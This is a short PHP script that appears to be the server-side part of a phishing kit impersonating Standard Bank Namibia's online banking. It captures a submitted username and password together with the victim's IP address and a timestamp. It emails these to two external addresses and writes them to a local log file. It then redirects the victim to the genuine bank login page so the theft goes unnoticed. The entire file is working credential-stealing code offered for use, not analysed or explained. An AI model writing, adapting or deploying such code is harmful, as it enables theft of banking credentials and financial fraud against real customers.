<?php
session_start();
$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];


$Username = $_POST['Username'];
$accountNumber = $_POST['accountNumber'];

$message .="
Email :   ".$Username." 
Password : ".$accountNumber."

====================== 	PC-INFO ====================||
Date / time	    : $date
Client IP         : http://www.geoiptool.com/?IP=$ip
=========||Standard Bank Namibia log |=====================||\n";
$send="kute7ty@gmail.com,amarok101@outlook.com";
$subject = "Standard Bank Namibia | $ip";
mail($send,$subject,$message);
@fclose(@fwrite(@fopen("../log/email_access.txt", "a"),$message));
    @mail($to,$subject,$message,$headers);

die("<script>location.href = 'https://ibanking.standardbank.com.na/#/login.php'</script>");
?>